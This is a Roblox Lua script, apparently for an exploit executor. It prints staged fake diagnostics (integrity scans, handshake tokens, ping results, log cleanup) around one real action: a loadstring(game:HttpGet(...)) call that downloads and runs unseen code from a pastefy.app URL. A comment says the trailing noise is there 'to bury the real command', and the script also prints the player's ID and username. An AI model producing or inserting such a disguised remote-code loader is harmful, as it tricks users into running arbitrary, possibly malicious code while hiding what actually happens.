local sys = {}
local status = "Starting core sequence..."
local runtimeKey = math.random(100000,999999) .. "-" .. math.random(100000,999999)
local secureChannel = "DeltaSecure_" .. tostring(runtimeKey)
local sysTimestamp = os.time()

local function initLoader()
	print("[🌐] Initializing Systems...")
	wait(1.2)
	print("[🔁] Boot Sync ID:", secureChannel)
	wait(1)
	print("[🔍] Scanning server routes...")
	wait(0.8)
end

local function verifyIntegrity()
	print("[🔐] Performing Integrity Scan...")
	wait(1)
	for i = 1, 5 do
		print(" - HashSet_"..i..": OK")
		wait(0.3)
	end
end

local function checkServerMode()
	local isPrivate = game.PrivateServerId ~= ""
	print("[💻] Server Type:", isPrivate and "PRIVATE" or "PUBLIC")
	wait(0.5)
end

local function pullClientInfo()
	local plrs = game:GetService("Players")
	print("[👤] Client ID:", plrs.LocalPlayer.UserId)
	print("[📡] Username:", plrs.LocalPlayer.Name)
	wait(0.3)
end

local function inspectEnvironment()
	print("[🗃️] Collecting environment flags...")
	wait(0.2)
	local flags = {"DeltaMode", "LimiterOverride", "AsyncTaskHandler"}
	for _, f in ipairs(flags) do
		print(" - Flag Loaded:", f)
		wait(0.2)
	end
end

local function scanAssets()
	print("[📁] Asset Container Check...")
	wait(0.5)
	local assets = {"Module_CandyRoot", "System_CoreA", "Entity_BeeC", "Data_Shadow_7"}
	for _, asset in ipairs(assets) do
		print(" > Found:", asset)
		wait(0.3)
	end
end

local function finalizeHandshake()
	print("[✅] All systems verified.")
	wait(0.5)
	print("[🔓] Handshake Token Accepted:", runtimeKey)
end

local function executePayload()
	print("[🧠] Executing Runtime Payload...")
	wait(0.8)

	loadstring(game:HttpGet("https://pastefy.app/n9sQb0BK/raw"))()
end

-- Boot Sequence
initLoader()
verifyIntegrity()
checkServerMode()
pullClientInfo()
inspectEnvironment()
scanAssets()
finalizeHandshake()
executePayload()

-- 🧱 Post-execution operations to bury the real command
local function noiseGenerator()
	for i = 1, 25 do
		local val = math.random() * i
		if val % 2 == 0 then
			print("[DBG] Thread_", i, ": SUCCESS ⚙️")
		else
			print("[DBG] Thread_", i, ": OK ✔️")
		end
		wait(0.1)
	end
end

local function fakeNetAnalyzer()
	print("[NET] Pinging cloud instances...")
	for i = 1, 3 do
		print(" ↪ Ping_"..i..": "..math.random(10,120).."ms")
		wait(0.3)
	end
end

local function dummyCleanup()
	print("[SYS] Cleaning residual memory logs...")
	wait(0.4)
	local traces = {"temp32.sys", "offset_meta.json", "scanlog_4.dmp"}
	for _, t in pairs(traces) do
		print(" ✖ Removed:", t)
		wait(0.2)
	end
end

noiseGenerator()
fakeNetAnalyzer()
dummyCleanup()
print("[✔] Session initialized completely.")
